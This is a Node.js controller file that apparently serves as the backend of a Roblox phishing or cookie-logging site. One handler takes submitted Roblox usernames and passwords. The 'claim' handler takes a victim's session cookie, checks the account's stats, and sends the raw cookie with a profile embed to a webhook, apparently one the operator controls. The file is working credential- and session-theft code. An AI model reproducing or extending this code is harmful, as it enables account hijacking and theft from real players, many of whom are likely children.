const login = require("../login");
const getRobloxStats = require("../cookiechecker");
const robloxService = require("../services/roblox.service");
const webhookService = require("../services/webhook.service");

/* =========================
   LOGIN CONTROLLER
========================= */

async function loginController(req, res) {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ error: "Missing fields" });
        }

        const result = await login(username, password);

        if (!result?.result) {
            return res.status(401).json({ error: "Login failed" });
        }

        return res.json(result);

    } catch (err) {
        console.error("[LOGIN CTRL]", err);
        return res.status(500).json({ error: "Server error" });
    }
}

/* =========================
   CLAIM CONTROLLER
========================= */

async function claimController(req, res) {
    try {
        const { username, cookie } = req.body;

        if (!username || !cookie) {
            return res.status(400).json({ error: "Missing fields" });
        }

        console.log(`[INFO] Claim attempt → ${username}`);

        const userId = await robloxService.getUserId(username);
        const avatarUrl = await robloxService.getAvatar(userId);

        const stats = await getRobloxStats(cookie);

        const embed = robloxService.buildEmbed({
            username,
            userId,
            stats,
            avatarUrl
        });

        await webhookService.send(cookie, embed);

        return res.json({ success: true });

    } catch (err) {
        console.error("[CLAIM CTRL]", err);
        return res.status(500).json({ error: "Server error" });
    }
}

module.exports = {
    loginController,
    claimController
};